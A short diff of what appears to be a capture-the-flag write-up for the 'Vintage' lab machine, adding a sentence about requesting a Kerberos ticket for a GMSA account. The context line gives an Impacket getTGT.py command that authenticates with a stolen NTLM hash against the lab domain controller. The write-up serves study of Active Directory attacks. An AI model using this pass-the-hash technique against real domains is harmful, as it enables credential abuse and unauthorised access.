@@ -95,6 +95,7 @@ The **ServiceManagers** group possesses The ServiceManagers group possesses Gene
 
 <img width="1114" height="398" alt="image" src="https://github.com/user-attachments/assets/850cfa72-184c-4eba-964d-53f24764b3e5" />
 
+To ensure stability with Python exploitation scripts, we requested a Ticket Granting Ticket (TGT) for the GMSA account and exported it to our environment variables:
 
 `getTGT.py 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205 -hashes :0851299c01b944d01099fc977eaa6c67 `
 
